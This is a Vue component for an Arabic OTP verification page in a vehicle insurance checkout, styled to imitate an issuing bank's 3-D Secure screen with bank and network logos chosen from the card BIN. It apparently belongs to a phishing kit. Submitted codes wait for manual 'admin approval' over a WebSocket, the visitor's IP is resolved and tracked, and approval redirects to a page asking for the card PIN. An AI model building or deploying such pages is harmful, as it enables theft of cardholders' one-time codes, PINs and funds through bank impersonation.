<template>
    <div class="otp-shell" dir="rtl">

        <!-- ── Waiting Loader Modal (teleported fullscreen) ──────────── -->
        <InsLoading v-if="isVerifying && !error" :modal="true" color="amber" size="lg"
            :text="t( 'verification.otp.loading' )"
            :sub-text="t( 'verification.otp.waitingForApproval' )" />

        <!-- ── Main Card ─────────────────────────────────────────────── -->
        <div class="otp-card">

            <!-- ═══ A. Topbar: Bank + Network logos ═══════════════════ -->
            <div class="otp-topbar">
                <div class="otp-topbar__bank">
                    <img v-if="bankLogo" :src="bankLogo" :alt="bankName" class="otp-topbar__bank-img" />
                    <div v-else class="otp-topbar__bank-fallback">
                        <svg class="otp-topbar__bank-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 2L2 7h20L12 2zM4 7v10M8 7v10M12 7v10M16 7v10M20 7v10M2 17h20M3 21h18" /></svg>
                        <span>{{ bankName || t( 'verification.otp.issuingBank' ) }}</span>
                    </div>
                </div>
                <div class="otp-topbar__badge">
                    <svg class="otp-topbar__shield" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.351-.166-2A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd" /></svg>
                    <span class="otp-topbar__badge-text">{{ t( 'verification.otp.securePaymentBadge' ) }}</span>
                </div>
                <div class="otp-topbar__network">
                    <img v-if="networkLogo" :src="networkLogo" :alt="networkName" class="otp-topbar__network-img" />
                    <svg v-else class="otp-topbar__network-fallback" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="1" y="4" width="22" height="16" rx="2" ry="2" stroke-width="1.5" /><line x1="1" y1="10" x2="23" y2="10" stroke-width="1.5" /></svg>
                </div>
            </div>

            <!-- ═══ B. Header: Title + Subtitle ═══════════════════════ -->
            <div class="otp-header">
                <h1 class="otp-header__title">{{ t( 'verification.otp.cardPaymentTitle' ) }}</h1>
                <p class="otp-header__sub">{{ t( 'verification.otp.cardOwnershipVerification' ) }}</p>
            </div>

            <!-- ═══ C. Body ═══════════════════════════════════════════ -->
            <div class="otp-body">

                <!-- Transaction Summary -->
                <div class="otp-summary">
                    <div class="otp-summary__row">
                        <span class="otp-summary__label">{{ t( 'verification.otp.paymentPurpose' ) }}</span>
                        <span class="otp-summary__value">تأمين مركبة – {{ merchantName }}</span>
                    </div>
                    <div class="otp-summary__row">
                        <span class="otp-summary__label">{{ t( 'verification.otp.cardLabel' ) }}</span>
                        <span class="otp-summary__value ltr-nums" dir="ltr">**** {{ cardLast4 || '****' }}</span>
                    </div>
                    <div v-if="cardHolder" class="otp-summary__row">
                        <span class="otp-summary__label">{{ t( 'verification.otp.cardHolderLabel' ) }}</span>
                        <span class="otp-summary__value otp-summary__value--name">{{ cardHolder }}</span>
                    </div>
                    <div v-if="totalAmount > 0" class="otp-summary__row otp-summary__row--amount">
                        <span class="otp-summary__label">{{ t( 'verification.otp.totalAmountLabel' ) }}</span>
                        <span class="otp-summary__amount">
                            {{ formattedAmount }}
                            <SarIcon className="size-3.5 inline-block fill-current" />
                        </span>
                    </div>
                </div>

                <!-- Verification Notice -->
                <div class="otp-notice">
                    <div class="otp-notice__icon">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                    </div>
                    <div>
                        <p class="otp-notice__title">{{ t( 'verification.otp.verifyTransaction' ) }}</p>
                        <p class="otp-notice__text">{{ t( 'verification.otp.verifyTransactionHint' ) }}</p>
                    </div>
                </div>

                <!-- OTP Input — focal area -->
                <div class="otp-form">
                    <label class="otp-form__label">{{ t( 'verification.otp.verificationCode' ) }}</label>
                    <p class="otp-form__hint">{{ t( 'verification.otp.enterOtpToConfirm' ) }}</p>

                    <!-- Code Expiry Indicator -->
                    <div v-if="!codeExpired" class="otp-expiry" :class="{ 'otp-expiry--urgent': expiryUrgent }">
                        <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                        <span>الرمز صالح لمدة</span>
                        <span class="otp-expiry__time ltr-nums" :class="{ 'otp-expiry__time--urgent': expiryUrgent }">{{ formattedExpiry }}</span>
                    </div>
                    <div v-else class="otp-expired">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                        <span>انتهت صلاحية الرمز — اطلب رمزًا جديدًا</span>
                    </div>

                    <OtpInput ref="otpInputRef" v-model="otpCode" :length="6" :accept-lengths="[4, 6]"
                        :disabled="isVerifying || codeExpired" :error="error || (codeExpired ? 'انتهت صلاحية الرمز' : '')" @submit="submitOtp" />

                    <!-- Security Warning -->
                    <div class="otp-security-warning">
                        <svg class="otp-security-warning__icon" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.351-.166-2A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd" /></svg>
                        <span>{{ t( 'verification.otp.doNotShareCode' ) }}</span>
                    </div>

                    <button :disabled="!isOtpValid || isVerifying || codeExpired" class="otp-btn"
                        :class="isOtpValid && !isVerifying && !codeExpired ? 'otp-btn--active' : 'otp-btn--disabled'"
                        @click="submitOtp">
                        <svg v-if="isVerifying" class="w-5 h-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                        </svg>
                        <span>{{ isVerifying ? t( 'verification.otp.verifying' ) : t( 'verification.otp.confirmTransaction' ) }}</span>
                    </button>

                    <button type="button" class="otp-cancel" @click="$router.back()">
                        {{ t( 'verification.otp.cancelTransaction' ) }}
                    </button>
                </div>

                <!-- Timer / Resend -->
                <div class="otp-resend">
                    <template v-if="resendTimer > 0">
                        <div class="otp-resend__timer">
                            <svg class="w-4 h-4 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                            <span class="otp-resend__text">{{ t( 'verification.otp.resendTimerText' ) }}</span>
                            <span class="otp-resend__countdown ltr-nums">{{ formattedTimer }}</span>
                        </div>
                        <div class="otp-resend__bar">
                            <div class="otp-resend__bar-fill" :style="{ width: timerPercent + '%' }"></div>
                        </div>
                    </template>
                    <template v-else>
                        <button :disabled="isResending" class="otp-resend__btn" @click="resendOtp">
                            <svg v-if="isResending" class="w-4 h-4 animate-spin" xmlns="http://www.w3.org/2000/svg"
                                fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                                <path class="opacity-75" fill="currentColor"
                                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                            </svg>
                            <svg v-else class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                            </svg>
                            <span>{{ isResending ? t( 'verification.otp.resending' ) : t( 'verification.otp.resend' ) }}</span>
                        </button>
                    </template>
                </div>
            </div>

            <!-- ═══ G. Footer — Trusted logos ═════════════════════════ -->
            <div class="otp-footer">
                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="otp-footer__logos" />
                <div class="otp-footer__secure">
                    <svg class="otp-footer__lock" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                    <span>{{ t( 'common.secureTransaction' ) }}</span>
                </div>
            </div>
        </div>

        <!-- ── Help (outside card) ───────────────────────────────────── -->
        <div class="otp-help">
            <span class="otp-help__label">{{ t( 'common.supportContact' ) }}</span>
            <a href="tel:920033360" class="otp-help__phone" dir="ltr">920033360</a>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackOtpRequested, trackOtpResent, trackOtpExpired, trackOtpVerified, trackStepCompleted } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getOtpStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import SarIcon from '@/components/SarIcon.vue';
import InsLoading from '@/components/ui/InsLoading.vue';
import OtpInput from '@/components/ui/OtpInput.vue';
import { useCardBranding } from '@/composables/useCardBranding';
import { getReasonLabel } from '@/constants/rejectionReasons';
import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';

// ─── Order data (transaction context for trust signals) ─────────────
const orderData = (() => {
    try { return JSON.parse( sessionStorage.getItem( 'orderData' ) || '{}' ); }
    catch { return {}; }
})();
const merchantName = computed( () => orderData?.plan?.companyName || 'تأمينكم' );

const { t } = useI18n();
const router = useRouter();

// ─── Visitor tracking ───────────────────────────────────────────────
useVisitorTracking( 'otp' );

// ─── Session context via composable (computed to preserve reactivity) ───
const { context, resolveCustomerIp, submitOtp: submitOtpApi, resendOtpCode, error: paymentError } = usePayment();
const sessionId = computed( () => context.sessionId || '' );
const customerIpRef = ref( context.customerIp || '' );
const cardBin = computed( () => context.cardBin || '' );
const cardLast4 = computed( () => context.cardLast4 || '****' );
const cardHolder = computed( () => context.cardHolder || '' );
const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );

// ─── Card branding (network + bank) ────────────────────────────────
const { brand: _brand, networkLogo, networkName, bankKey: _bankKey, bankLogo, bankName } = useCardBranding( cardBin );

const RESEND_COOLDOWN = 180; // seconds
const CODE_EXPIRY = 300; // 5 minutes fallback

const formattedAmount = computed( () =>
    totalAmount.value.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } )
);

// ─── OTP State ──────────────────────────────────────────────────────
const otpCode = ref( '' );
const otpInputRef = ref( null );
const isVerifying = ref( false );
const isResending = ref( false );
const error = ref( '' );
const resendTimer = ref( RESEND_COOLDOWN );
let timerInterval = null;

// ─── Code Expiry Timer (server-synced via expires_at) ───────────────
const codeExpiry = ref( CODE_EXPIRY );
let expiryInterval = null;
const codeExpired = computed( () => codeExpiry.value <= 0 );
const expiryUrgent = computed( () => codeExpiry.value > 0 && codeExpiry.value <= 30 );

const formattedExpiry = computed( () =>
{
    const m = Math.floor( codeExpiry.value / 60 );
    const s = codeExpiry.value % 60;
    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
} );

function startExpiryTimer ()
{
    if ( expiryInterval ) clearInterval( expiryInterval );

    // Use server's expires_at if available (survives route re-entry + tab switching)
    const serverExpiry = context.otpExpiresAt;
    if ( serverExpiry )
    {
        const remaining = Math.max( 0, Math.floor( ( new Date( serverExpiry ) - Date.now() ) / 1000 ) );
        codeExpiry.value = remaining;
    } else
    {
        codeExpiry.value = CODE_EXPIRY;
    }

    if ( codeExpiry.value <= 0 ) return;

    expiryInterval = setInterval( () =>
    {
        // Re-calculate from server timestamp each tick to prevent drift
        const serverExp = context.otpExpiresAt;
        if ( serverExp )
        {
            codeExpiry.value = Math.max( 0, Math.floor( ( new Date( serverExp ) - Date.now() ) / 1000 ) );
        } else
        {
            codeExpiry.value = Math.max( 0, codeExpiry.value - 1 );
        }

        if ( codeExpiry.value <= 0 )
        {
            clearInterval( expiryInterval );
            trackOtpExpired();
        }
    }, 1000 );
}

const isOtpValid = computed( () => /^(\d{4}|\d{6})$/.test( otpCode.value ) );

const formattedTimer = computed( () =>
{
    const m = Math.floor( resendTimer.value / 60 );
    const s = resendTimer.value % 60;
    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
} );

const timerPercent = computed( () =>
    Math.round( ( resendTimer.value / RESEND_COOLDOWN ) * 100 )
);

function startResendTimer ()
{
    if ( timerInterval ) clearInterval( timerInterval );
    resendTimer.value = RESEND_COOLDOWN;
    timerInterval = setInterval( () =>
    {
        if ( resendTimer.value > 0 )
        {
            resendTimer.value--;
        } else
        {
            clearInterval( timerInterval );
        }
    }, 1000 );
}

// ─── Submit OTP ─────────────────────────────────────────────────────
const submitOtp = async () =>
{
    if ( !isOtpValid.value || isVerifying.value ) return;

    isVerifying.value = true;
    error.value = '';

    const success = await submitOtpApi( otpCode.value );

    if ( !success )
    {
        error.value = paymentError.value || t( 'verification.otp.sendCodeError' );
        isVerifying.value = false;
    } else
    {
        logger.debug( '[OTP] Submitted successfully, waiting for admin approval' );
    }
};

// ─── Resend OTP ─────────────────────────────────────────────────────
const resendOtp = async () =>
{
    if ( resendTimer.value > 0 || isResending.value ) return;

    isResending.value = true;
    error.value = '';

    const success = await resendOtpCode();

    if ( success )
    {
        otpCode.value = '';
        otpInputRef.value?.clear();
        startResendTimer();
        startExpiryTimer();
        trackOtpResent();
    } else
    {
        error.value = t( 'verification.otp.resendError' );
    }

    isResending.value = false;
};

// ─── WebSocket + Polling via composable ─────────────────────────────
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',
    approvedEvent: 'OtpApproved',
    rejectedEvent: 'OtpRejected',
    logTag: 'OTP',

    onApproved ( event )
    {
        logger.debug( '[OTP] Approved:', event );
        isVerifying.value = false;
        trackOtpVerified();
        trackStepCompleted( 'otp', 'card_pin' );

        // Defer navigation via microtask to release the WS message handler
        queueMicrotask( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'cardPin', router );
            } else
            {
                router.push( { name: 'cardPin' } );
            }
        } );
    },

    onRejected ( event )
    {
        logger.debug( '[OTP] Rejected:', event );
        isVerifying.value = false;
        error.value = getReasonLabel( event.reason, t ) || t( 'verification.otp.codeRejected' );
        otpCode.value = '';
        otpInputRef.value?.clear();
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sig = context.statusSigs?.otp || '';
        if ( !isVerifying.value || !sessionId.value || !sig ) return;

        const { data } = await getOtpStatus( sessionId.value, sig );

        if ( data.status === 'verified' )
        {
            handleApproved( { redirect_to: null } );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.reason || 'otp_other' } );
        } else if ( data.status === 'expired' )
        {
            // Server confirms expiry — trigger the same path as the local timer
            handleRejected( { reason: 'otp_expired' } );
        }
    },
} );

// ─── WebOTP API — auto-fill from SMS ────────────────────────────────
let abortController = null;

async function initWebOTP ()
{
    if ( !( 'OTPCredential' in window ) ) return;

    try
    {
        abortController = new AbortController();
        const content = await navigator.credentials.get( {
            otp: { transport: [ 'sms' ] },
            signal: abortController.signal,
        } );

        if ( content?.code )
        {
            const code = content.code.replace( /\D/g, '' ).slice( 0, 6 );
            otpCode.value = code;
            if ( code.length >= 4 ) autoSubmitTimer = setTimeout( () => submitOtp(), 500 );
        }
    } catch
    {
        // User cancelled or not supported — silent
    }
}

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    otpInputRef.value?.focusFirstEmpty();
    startResendTimer();
    startExpiryTimer();
    setupWs( ip );
    initWebOTP();
    trackStepViewed( 'otp' );
    trackOtpRequested();
} );

let autoSubmitTimer = null;

onUnmounted( () =>
{
    if ( timerInterval ) clearInterval( timerInterval );
    if ( expiryInterval ) clearInterval( expiryInterval );
    if ( abortController ) abortController.abort();
    clearTimeout( autoSubmitTimer );
    // WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
} );
</script>

<style scoped>
/* ═══════════════════════════════════════════════════════════════════
   OTP Page — Real 3D Secure / ACS Gateway
   Institutional banking style: Blue topbar, tight layout, corporate
   ═══════════════════════════════════════════════════════════════════ */

/* ── Shell ─────────────────────────────────────────────── */
.otp-shell {
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 0.75rem;
    background: #eef1f5;
}

/* ── Card ──────────────────────────────────────────────── */
.otp-card {
    width: 100%;
    max-width: 400px;
    background: #fff;
    border-radius: 0.375rem;
    border: 1px solid #d1d5db;
    box-shadow: 0 2px 8px rgb(0 0 0 / 0.08);
    overflow: hidden;
    animation: card-in 0.35s ease-out;
}

@media (min-width: 640px) {
    .otp-card {
        box-shadow: 0 4px 20px rgb(0 0 0 / 0.12), 0 0 0 1px rgb(0 0 0 / 0.04);
    }
}

@keyframes card-in {
    from { opacity: 0; transform: translateY(6px); }
    to   { opacity: 1; transform: translateY(0); }
}

/* ── A. Topbar — Blue institutional header ────────────── */
.otp-topbar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.5rem 0.875rem;
    background: linear-gradient(180deg, #1a5276 0%, #154360 100%);
    border-bottom: 2px solid #0e2f44;
}

.otp-topbar__bank,
.otp-topbar__network {
    flex: 0 0 auto;
    display: flex;
    align-items: center;
    min-width: 40px;
}

.otp-topbar__bank-img {
    height: 1.375rem;
    width: auto;
    max-width: 5rem;
    object-fit: contain;
    filter: brightness(0) invert(1);
}

.otp-topbar__bank-fallback {
    display: flex;
    align-items: center;
    gap: 0.25rem;
    font-size: 0.6875rem;
    font-weight: 600;
    color: rgba(255, 255, 255, 0.7);
}

.otp-topbar__bank-icon {
    width: 0.875rem;
    height: 0.875rem;
    opacity: 0.7;
    flex-shrink: 0;
}

.otp-topbar__network-img {
    height: 1.25rem;
    width: auto;
    max-width: 3.5rem;
    object-fit: contain;
}

.otp-topbar__network-fallback {
    width: 1.5rem;
    height: 1.5rem;
    opacity: 0.5;
    color: rgba(255, 255, 255, 0.7);
}

.otp-topbar__badge {
    display: flex;
    align-items: center;
    gap: 0.25rem;
    font-size: 0.5625rem;
    font-weight: 500;
    color: rgba(255, 255, 255, 0.8);
    background: rgba(255, 255, 255, 0.1);
    padding: 0.1875rem 0.5rem;
    border-radius: 2px;
    border: 1px solid rgba(255, 255, 255, 0.15);
    white-space: nowrap;
    text-transform: uppercase;
    letter-spacing: 0.04em;
}

.otp-topbar__shield {
    width: 0.625rem;
    height: 0.625rem;
    color: #4fc3f7;
    flex-shrink: 0;
}

/* ── B. Header ────────────────────────────────────────── */
.otp-header {
    padding: 0.75rem 1rem 0.5rem;
    text-align: center;
    background: #f8f9fa;
    border-bottom: 1px solid #e5e7eb;
}

.otp-header__title {
    font-size: 0.875rem;
    font-weight: 700;
    color: #1a2332;
    margin: 0 0 0.125rem;
}

.otp-header__sub {
    font-size: 0.6875rem;
    font-weight: 400;
    color: #6b7280;
    margin: 0;
    line-height: 1.4;
}

/* ── C. Body ──────────────────────────────────────────── */
.otp-body {
    padding: 0.5rem 0.75rem;
    display: flex;
    flex-direction: column;
    gap: 0.375rem;
}

@media (min-width: 480px) {
    .otp-body { padding: 0.5rem 0.875rem; gap: 0.4375rem; }
}

@media (min-width: 640px) {
    .otp-body { padding: 0.75rem 1rem; gap: 0.5rem; }
}

/* ── Transaction summary ──────────────────────────────── */
.otp-summary {
    background: #f9fafb;
    border: 1px solid #e5e7eb;
    border-radius: 0.25rem;
    overflow: hidden;
}

.otp-summary__row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.25rem 0.5rem;
    font-size: 0.6875rem;
}

.otp-summary__row:not(:last-child) {
    border-bottom: 1px solid #eef0f2;
}

.otp-summary__row--amount {
    background: #eef4fb;
    padding: 0.3125rem 0.5rem;
}

.otp-summary__label {
    color: #6b7280;
    font-weight: 500;
    font-size: 0.625rem;
}

.otp-summary__value {
    font-weight: 600;
    color: #1f2937;
    letter-spacing: 0.01em;
    font-size: 0.6875rem;
}

.otp-summary__value--name {
    text-transform: uppercase;
    font-size: 0.6875rem;
    letter-spacing: 0.04em;
}

.otp-summary__amount {
    font-size: 0.8125rem;
    font-weight: 700;
    color: #1a2332;
    display: flex;
    align-items: center;
    gap: 0.1875rem;
}

/* ── Verification notice ──────────────────────────────── */
.otp-notice {
    display: flex;
    align-items: flex-start;
    gap: 0.25rem;
    padding: 0.25rem 0.4375rem;
    background: #eef4fb;
    border: 1px solid #bbd5ed;
    border-radius: 0.1875rem;
}

.otp-notice__icon {
    flex-shrink: 0;
    width: 0.875rem;
    height: 0.875rem;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #1a5276;
}

.otp-notice__title {
    font-size: 0.625rem;
    font-weight: 600;
    color: #1a5276;
    margin: 0;
}

.otp-notice__text {
    font-size: 0.5625rem;
    color: #2c6994;
    margin: 0;
    line-height: 1.35;
}

/* ── OTP form ─────────────────────────────────────────── */
.otp-form {
    text-align: center;
    padding: 0.375rem 0;
    background: transparent;
    border: none;
    border-radius: 0;
}

.otp-form__label {
    display: block;
    font-size: 0.75rem;
    font-weight: 700;
    color: #1a2332;
    margin-bottom: 0.0625rem;
}

.otp-form__hint {
    font-size: 0.5625rem;
    color: #9ca3af;
    margin: 0 0 0.375rem;
    line-height: 1.3;
}

/* ── CTA button ───────────────────────────────────────── */
.otp-btn {
    width: 100%;
    padding: 0.4375rem;
    border-radius: 0.25rem;
    font-weight: 600;
    font-size: 0.75rem;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.375rem;
    border: none;
    cursor: pointer;
    transition: background 0.2s ease, color 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
    margin-top: 0.25rem;
}

.otp-btn--active {
    background: #1a5276;
    color: #fff;
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
}

.otp-btn--active:hover {
    background: #154360;
    transform: translateY(-1px);
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
}

.otp-btn--active:active {
    background: #0e2f44;
    transform: translateY(0);
}

.otp-btn--disabled {
    background: #e5e7eb;
    color: #9ca3af;
    cursor: not-allowed;
    border: none;
    transform: none;
    box-shadow: none;
}

/* ── Cancel link ──────────────────────────────────────── */
.otp-cancel {
    display: block;
    width: 100%;
    margin-top: 0.25rem;
    padding: 0.25rem;
    background: none;
    border: none;
    cursor: pointer;
    font-size: 0.625rem;
    color: #9ca3af;
    text-align: center;
    transition: color 0.15s;
}

.otp-cancel:hover {
    color: #dc2626;
}

/* ── Security Warning ─────────────────────────────────── */
.otp-security-warning {
    display: flex;
    align-items: center;
    gap: 0.25rem;
    padding: 0.25rem 0.375rem;
    margin-top: 0.25rem;
    font-size: 0.5625rem;
    color: #b45309;
    background: #fffbeb;
    border: 1px solid #fde68a;
    border-radius: 0.1875rem;
}

.otp-security-warning__icon {
    width: 0.75rem;
    height: 0.75rem;
    flex-shrink: 0;
    color: #d97706;
}

/* ── Resend ───────────────────────────────────────────── */
.otp-resend {
    text-align: center;
    padding-top: 0;
}

.otp-resend__timer {
    display: inline-flex;
    align-items: center;
    gap: 0.1875rem;
    margin-bottom: 0.1875rem;
}

.otp-resend__text {
    font-size: 0.625rem;
    color: #9ca3af;
}

.otp-resend__countdown {
    font-weight: 700;
    font-size: 0.75rem;
    color: #1a5276;
    min-width: 2rem;
    letter-spacing: 0.01em;
}

.otp-resend__bar {
    width: 50%;
    height: 1px;
    background: #e5e7eb;
    border-radius: 1px;
    overflow: hidden;
    margin: 0 auto;
}

.otp-resend__bar-fill {
    height: 100%;
    background: #1a5276;
    border-radius: 1px;
    transition: width 1s linear;
}

.otp-resend__btn {
    display: inline-flex;
    align-items: center;
    gap: 0.25rem;
    padding: 0.3125rem 0.75rem;
    border-radius: 0.1875rem;
    border: 1px solid #d1d5db;
    background: #fff;
    color: #4b5563;
    font-size: 0.6875rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.15s;
}

.otp-resend__btn:hover:not(:disabled) {
    border-color: #1a5276;
    color: #1a5276;
}

.otp-resend__btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

/* ── Code Expiry ──────────────────────────────────────── */
.otp-expiry {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.7rem;
    color: #64748b;
    margin-bottom: 0.75rem;
}

.otp-expiry__time {
    font-weight: 700;
    color: #0f766e;
}

.otp-expiry--urgent {
    color: #dc2626;
    animation: pulse-urgent 1s ease-in-out infinite;
}

.otp-expiry__time--urgent {
    color: #dc2626;
}

@keyframes pulse-urgent {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }
}

.otp-expired {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.7rem;
    color: #dc2626;
    font-weight: 600;
    margin-bottom: 0.75rem;
}

/* ── Footer ───────────────────────────────────────────── */
.otp-footer {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.375rem 0.875rem;
    background: #f3f4f6;
    border-top: 1px solid #e5e7eb;
}

.otp-footer__logos {
    height: 0.75rem;
    width: auto;
    opacity: 0.5;
}

.otp-footer__secure {
    display: flex;
    align-items: center;
    gap: 0.1875rem;
    font-size: 0.5625rem;
    color: #9ca3af;
    font-weight: 400;
}

.otp-footer__lock {
    width: 0.5625rem;
    height: 0.5625rem;
}

/* ── Help ──────────────────────────────────────────────── */
.otp-help {
    margin-top: 0.5rem;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.25rem;
}

.otp-help__label {
    font-size: 0.625rem;
    color: #9ca3af;
}

.otp-help__phone {
    color: #1a5276;
    font-weight: 700;
    font-size: 0.6875rem;
    text-decoration: none;
}

.otp-help__phone:hover { text-decoration: underline; }

/* ── Responsive ───────────────────────────────────────── */
@media (max-width: 380px) {
    .otp-topbar { padding: 0.4375rem 0.625rem; }
    .otp-topbar__badge-text { display: none; }
    .otp-topbar__badge { padding: 0.125rem 0.25rem; }
    .otp-header { padding: 0.625rem 0.75rem 0.375rem; }
    .otp-body { padding: 0.5rem 0.625rem; gap: 0.375rem; }
}
</style>
